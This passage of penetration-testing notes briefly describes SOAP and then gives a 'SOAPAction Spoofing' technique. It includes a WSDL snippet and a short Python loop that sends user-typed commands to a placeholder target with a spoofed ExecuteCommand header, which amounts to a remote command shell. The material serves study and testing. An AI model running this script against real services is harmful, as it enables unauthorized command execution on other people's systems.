   - Uses XML but provides more functionalities than XML-RPC.
   - Defines both a header structure and a payload structure.
   - Optional Web Services Definition Language (WSDL) declaration.
   - Various lower-level protocols (HTTP included) can be the transport.

### **SOAPAction Spoofing**

If following in wsdl file

```
<wsdl:operation name="ExecuteCommand">
<soap:operation soapAction="ExecuteCommand" style="document"/>
```

```
import requests

while True:
    cmd= input("$ ")
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri .org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```
